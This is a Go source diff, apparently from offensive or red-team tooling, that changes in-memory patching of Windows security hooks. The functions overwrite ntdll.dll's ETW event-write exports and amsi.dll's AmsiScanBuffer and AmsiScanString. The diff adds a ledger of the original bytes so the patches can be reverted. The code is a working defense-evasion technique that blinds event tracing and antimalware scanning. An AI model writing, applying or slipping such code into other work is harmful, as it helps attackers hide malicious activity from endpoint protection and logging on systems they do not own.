@@ -125,7 +125,7 @@ func (r PatchReport) String() string {
 }
 
 // patchExports 逐个解析并 patch；全部失败才算失败（返回第一条错误）。
-func patchExports(dll string, names []string, patch []byte, loadIfMissing bool) (PatchReport, error) {
+func patchExports(tag, dll string, names []string, patch []byte, loadIfMissing bool) (PatchReport, error) {
 	rep := PatchReport{Module: dll}
 	lib := windows.NewLazySystemDLL(dll)
 	var firstErr error
@@ -152,6 +152,9 @@ func patchExports(dll string, names []string, patch []byte, loadIfMissing bool) 
 			}
 		}
 		addr := proc.Addr()
+		// 阶段四：写入前先把原始字节记进台账，否则补丁永久不可撤销。
+		// 读失败也要记账（Original 为空），撤销时会因长度不符而跳过并报告。
+		original := readMemory(addr, len(patch))
 		if err := patchBytes(addr, patch); err != nil {
 			rep.Targets = append(rep.Targets, PatchTarget{Name: name, Addr: addr, Err: err})
 			if firstErr == nil {
@@ -159,6 +162,7 @@ func patchExports(dll string, names []string, patch []byte, loadIfMissing bool) 
 			}
 			continue
 		}
+		recordPatch(tag, dll, name, addr, original, patch)
 		rep.Targets = append(rep.Targets, PatchTarget{Name: name, Addr: addr})
 	}
 	return rep, firstErr
@@ -181,7 +185,7 @@ var etwPatchTargets = []string{
 
 // PatchETW patch ntdll 的 ETW 事件写入入口组。
 func PatchETW() (PatchReport, error) {
-	rep, err := patchExports("ntdll.dll", etwPatchTargets, patchEtwWrite, false)
+	rep, err := patchExports(TagETW, "ntdll.dll", etwPatchTargets, patchEtwWrite, false)
 	if err != nil {
 		return rep, err
 	}
@@ -203,7 +207,7 @@ var amsiPatchTargets = []string{"AmsiScanBuffer", "AmsiScanString"}
 
 // PatchAMSI patch amsi.dll 的扫描入口组（未加载时尝试加载）。
 func PatchAMSI() (PatchReport, error) {
-	rep, err := patchExports("amsi.dll", amsiPatchTargets, patchAmsi, true)
+	rep, err := patchExports(TagAMSI, "amsi.dll", amsiPatchTargets, patchAmsi, true)
 	if err != nil {
 		return rep, err
 	}
